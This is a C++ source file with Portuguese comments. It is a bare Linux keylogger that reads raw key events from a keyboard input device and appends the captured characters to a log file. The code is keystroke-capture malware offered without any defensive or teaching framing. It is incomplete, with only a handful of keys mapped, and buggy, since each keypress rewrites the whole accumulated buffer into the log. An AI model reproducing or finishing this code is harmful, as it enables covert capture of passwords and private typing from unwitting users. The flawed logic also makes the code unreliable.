#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

using namespace std;

int main() {
    string keys;
    int keyboard_fd = open("/dev/input/eventX", O_RDONLY); // Substitua "eventX" pelo dispositivo de teclado correto

    if (keyboard_fd == -1) {
        cout << "Erro ao abrir o dispositivo de teclado." << endl;
        return 1;
    }

    while (true) {
        struct input_event ev;
        read(keyboard_fd, &ev, sizeof(struct input_event));

        if (ev.type == EV_KEY && ev.value == 1) {
            switch (ev.code) {
                case KEY_A:
                    cout << "a";
                    keys += "a";
                    break;
                case KEY_B:
                    cout << "b";
                    keys += "b";
                    break;
                // Adicione casos para as outras teclas aqui...

                case KEY_ENTER:
                    cout << "<br>";
                    keys += "<br>";
                    break;
                case KEY_SPACE:
                    cout << " ";
                    keys += " ";
                    break;
                case KEY_DOT:
                    cout << ".";
                    keys += ".";
                    break;
                default:
                    break;
            }

            ofstream myfile;
            myfile.open("/home/user/log.txt", ios::app); // Substitua "/home/user/log.txt" pelo caminho e nome de arquivo desejado
            myfile << keys;
            myfile.close();
        }
    }

    close(keyboard_fd);
    return 0;
}
